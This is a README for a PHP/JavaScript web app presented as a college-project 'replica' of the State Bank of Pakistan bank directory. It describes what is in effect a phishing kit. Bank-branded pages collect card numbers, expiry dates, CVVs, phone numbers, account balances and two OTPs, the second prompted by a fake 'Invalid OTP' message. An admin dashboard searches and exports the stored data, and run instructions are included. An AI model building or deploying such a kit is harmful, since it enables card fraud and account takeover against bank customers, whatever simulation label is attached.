# State Bank of Pakistan (SBP) Bank Directory & Verification Simulation

A 1:1 complete replica and simulation of the State Bank of Pakistan Bank Directory web application built with **HTML5, CSS3 (Tailwind CSS), JavaScript (ES6+), and PHP** for testing and college project presentations.

---

## 🌟 Features

1. **Home Directory (`/`)**:
   - Header with SBP round emblem, Urdu Nastaleeq typography (*بینک دولت پاکستان*), notifications indicator.
   - Hero banner with 3 dynamic statistic cards (34 Licensed Banks, 5 Categories, 24/7 Reference).
   - Real-time live search filter by bank name with instant clear button.
   - Category filter pills with live counters: All (34), Conventional (12), Islamic (6), Public (5), Foreign (8), Specialized (3).
   - Infinite animated Marquee carousel for Top 5 Popular Banks (HBL, UBL, MCB, Bank Alfalah, Meezan Bank).
   - Complete grid of 34 licensed Pakistani commercial, Islamic, foreign, and specialized banks.

2. **Multi-Step Simulated Bank Verification Flow**:
   - **Step 1: Card Details (`/bank/:slug`)**:
     - Bank branded debit card visual with glowing dark gradient backdrop.
     - 16-digit card number input with automatic 4-digit space formatting (`0000 0000 0000 0000`).
     - Expiry Month (`01` - `12`) & Year (`2026` - `2035`) dropdown selectors.
     - 3-4 digit CVV security code input.
     - Pakistani mobile number format (`03XXXXXXXXX`).
     - Dynamic button state with Step 1 of 5 progress dots.
   - **Step 2: Confirm OTP (`/bank/:slug/otp`)**:
     - Masked mobile number display (`0300 *** 5678`).
     - 6 individual OTP digit boxes with automatic focus jumping, backspace retreat, arrow key navigation, and clipboard paste support.
     - 5-minute (`05:00`) countdown timer with active "Resend code" trigger.
     - Security warning box against OTP sharing.
     - Step 4 of 5 progress dots.
   - **Step 3: Account Balance (`/bank/:slug/balance`)**:
     - Live comma-formatted Pakistani Rupee balance input (`PKR 150,000`).
     - Bank encryption notice box.
     - Step 5 of 5 progress dots.
   - **Step 4: Re-Verify OTP (`/bank/:slug/verify`)**:
     - Final confirmation OTP input boxes.
     - Simulated feedback displaying *"Invalid OTP. Please try again."* alert to simulate banking validation.

3. **Real-time JSON File Persistence & Inspector**:
   - Every input across all steps is automatically saved in `data/submissions.json`.
   - **Admin Submissions Inspector (`/admin.php`)**:
     - Live auto-refreshing table displaying all captured simulation sessions.
     - Search & filter records by bank, phone, date, or card number.
     - View & copy raw JSON objects.
     - One-click **Export JSON** download button.
     - One-click **Clear Data** button.

---

## 🚀 How to Run

### Method 1: Using Built-in PHP Server (Fastest)

Open Terminal / PowerShell in the project directory:

```bash
cd "c:\Users\Aftab Kharal\Documents\sbp-bank-app"
"C:\xampp\php\php.exe" -S localhost:8000 router.php
```

Then open your browser:
- Main Directory: **[http://localhost:8000/](http://localhost:8000/)**
- HBL Card Details: **[http://localhost:8000/bank/hbl](http://localhost:8000/bank/hbl)**
- HBL Balance: **[http://localhost:8000/bank/hbl/balance](http://localhost:8000/bank/hbl/balance)**
- HBL Verify: **[http://localhost:8000/bank/hbl/verify](http://localhost:8000/bank/hbl/verify)**
- Admin Submissions Inspector: **[http://localhost:8000/admin.php](http://localhost:8000/admin.php)**

### Method 2: Using XAMPP / Apache

The project has also been synchronized to your XAMPP web directory:
- Path: `C:\xampp\htdocs\sbp-bank-app\`
- Start Apache in the XAMPP Control Panel.
- Access: **[http://localhost/sbp-bank-app/](http://localhost/sbp-bank-app/)**
- Admin Inspector: **[http://localhost/sbp-bank-app/admin.php](http://localhost/sbp-bank-app/admin.php)**

---

## 📁 Project Structure

```
sbp-bank-app/
├── index.php             # Main Bank Directory Page
├── bank.php              # Multi-step Card, OTP, Balance, and Verify controller
├── api.php               # JSON REST API for saving steps and exporting data
├── admin.php             # Live submission inspector dashboard
├── router.php            # Clean URL router for PHP CLI server
├── .htaccess             # Apache rewrite rules
├── data/
│   ├── banks.json        # 34 Pakistani banks dataset
│   └── submissions.json  # Real-time recorded simulation inputs
└── public/
    ├── css/
    │   └── style.css     # Tailwind CSS styles & animations
    ├── js/
    │   └── main.js       # Client validations, OTP handler, timer & AJAX
    └── logos/            # Bank & SBP logo assets
```

---

## 🎓 College Project Demonstration Notes

- All simulated inputs are stored cleanly in `data/submissions.json`.
- The live submission data can be monitored in real-time during your presentation on `/admin.php`.
- Disclaimers are included across all form views confirming this is a college project simulation.
